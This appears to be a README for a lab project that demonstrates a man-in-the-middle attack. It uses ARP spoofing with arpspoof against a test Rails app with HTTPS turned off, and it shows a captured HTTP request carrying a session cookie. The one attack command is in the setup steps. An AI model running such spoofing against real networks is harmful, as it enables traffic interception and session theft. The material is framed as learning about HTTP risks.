## Overview
This project demonstrates a basic Man-In-The-Middle (MITM) attack using ARP spoofing to intercept HTTP traffic in a local network.

## Key Features
- ARP Spoofing with `arpspoof`
- HTTP traffic sniffing using Python
- Target app: Ruby on Rails server for meetings
- HTTPS disabled for demonstration

## Setup
1. Launch the Rails app on a LAN IP (port 3000)
2. Disable HTTPS: `config.force_ssl = false`
3. Run ARP spoofing:
   ```bash
   sudo arpspoof -i eth0 -t [Victim-IP] [Router-IP]
4. Run Python sniffer script (included in sniffer.py)
5. Simulate traffic using:  ```bash curl http://[Victim-IP]:3000

 Sample output : 
 
 GET /meetings HTTP/1.1
User-Agent: curl/7.81.0
Cookie: session_id=abcd1234

## What I Learned:

Risks of using HTTP in local networks

Low-level network attack mechanics

Building sniffer tools with Python
